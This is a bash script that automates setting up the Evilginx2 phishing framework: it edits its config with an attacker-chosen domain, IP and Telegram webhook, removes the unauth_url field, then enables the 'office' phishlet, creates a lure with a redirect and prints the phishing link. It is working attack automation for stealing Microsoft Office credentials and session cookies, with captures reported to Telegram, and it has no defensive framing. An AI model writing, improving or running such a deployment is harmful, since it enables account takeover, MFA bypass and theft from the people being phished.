#!/usr/bin/env bash

LOG_FILE="/var/log/evilginx_auto.log"
CONFIG_FILE="/root/.evilginx/config.yaml"
TMUX_SESSION="evilginx"

# Function to log messages
log_message() {
    echo "[$(date)] $1" | tee -a "$LOG_FILE"
}

# Ensure `expect` and `tmux` are installed
log_message "[+] Checking if required packages are installed..."
for package in expect tmux; do
    if ! command -v "$package" &> /dev/null; then
        log_message "[!] '$package' not found. Installing..."
        sudo apt update && sudo apt install "$package" -y || { log_message "[!] Failed to install '$package'!"; exit 1; }
    else
        log_message "[+] '$package' is already installed."
    fi
done

# Prompt for user inputs
read -p "Enter domain: " DOMAIN
read -p "Enter external IPv4: " EXTERNAL_IPV4
read -p "Enter redirect URL: " REDIRECT_URL
read -p "Enter Telegram Webhook: " TELEGRAM_WEBHOOK

# Check if Evilginx is already running and kill it if necessary
if pgrep -x "evilginx2" > /dev/null; then
    log_message "[!] Found a running Evilginx instance. Killing it to prevent duplicates..."
    pkill -f evilginx2
    sleep 3  # Allow process to fully terminate
fi

# First Evilginx Run - Start and Exit Immediately
log_message "[+] Starting Evilginx for the first time and exiting..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "exit\r"
    expect eof
EOF

# Ensure Evilginx fully exits before modifying config
sleep 5  

# Check if the Evilginx config file exists before modifying
if [ -f "$CONFIG_FILE" ]; then
    log_message "[+] Modifying Evilginx config.yaml..."

    # Fix `dns_port` modification to prevent appending extra zeros
    if grep -q "dns_port: 5300" "$CONFIG_FILE"; then
        log_message "[+] dns_port is already set to 5300. No change needed."
    else
        sed -i 's/dns_port: [0-9]\+/dns_port: 5300/' "$CONFIG_FILE"
        log_message "[+] Changed dns_port to 5300"
    fi

    # Modify domain and external IPv4 dynamically
    sed -i "s|domain: .*|domain: \"$DOMAIN\"|" "$CONFIG_FILE"
    sed -i "s|external_ipv4: .*|external_ipv4: \"$EXTERNAL_IPV4\"|" "$CONFIG_FILE"

    # Remove the `unauth_url` field entirely
    sed -i '/unauth_url:/d' "$CONFIG_FILE"
    log_message "[+] Removed unauth_url from config.yaml"

    # Ensure webhook_telegram is correctly formatted under `general:`
    if grep -q "webhook_telegram:" "$CONFIG_FILE"; then
        sed -i "s|webhook_telegram: .*|webhook_telegram: \"$TELEGRAM_WEBHOOK\"|" "$CONFIG_FILE"
    else
        sed -i "/general:/a \ \ webhook_telegram: \"$TELEGRAM_WEBHOOK\"" "$CONFIG_FILE"
    fi
    log_message "[+] Updated webhook_telegram in config.yaml"

    log_message "[+] Config file modified successfully!"
else
    log_message "[!] Config file not found! Skipping modification."
    exit 1
fi

# Validate YAML syntax before restarting Evilginx
yaml_check=$(python3 -c "import yaml; yaml.safe_load(open('$CONFIG_FILE'))" 2>&1)
if [ $? -ne 0 ]; then
    log_message "[!] YAML Validation Error: $yaml_check"
    exit 1
fi

# Check if the tmux session already exists
if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
    log_message "[!] Tmux session '$TMUX_SESSION' already exists. Killing it to restart..."
    tmux kill-session -t "$TMUX_SESSION"
    sleep 2
fi

# Start tmux session and run Evilginx
log_message "[+] Starting Evilginx in a tmux session..."
tmux new-session -d -s "$TMUX_SESSION" bash -c "
    ./evilginx2;
    sleep 2;
    expect <<EOF | tee -a \"$LOG_FILE\"
        expect \"evilginx2 >\"
        send \"phishlets hostname office $DOMAIN\r\"
        expect \"evilginx2 >\"
        send \"phishlets enable office\r\"
        expect \"evilginx2 >\"
        send \"lures create office\r\"
        expect \"evilginx2 >\"
        send \"lures edit 0 redirect_url $REDIRECT_URL\r\"
        expect \"evilginx2 >\"
        send \"lures get-url 0\r\"
        expect \"evilginx2 >\"
        send \"config\r\"
        expect \"evilginx2 >\"
    EOF
"

log_message "[+] Evilginx is running in a tmux session. Attach using: tmux attach -t $TMUX_SESSION"
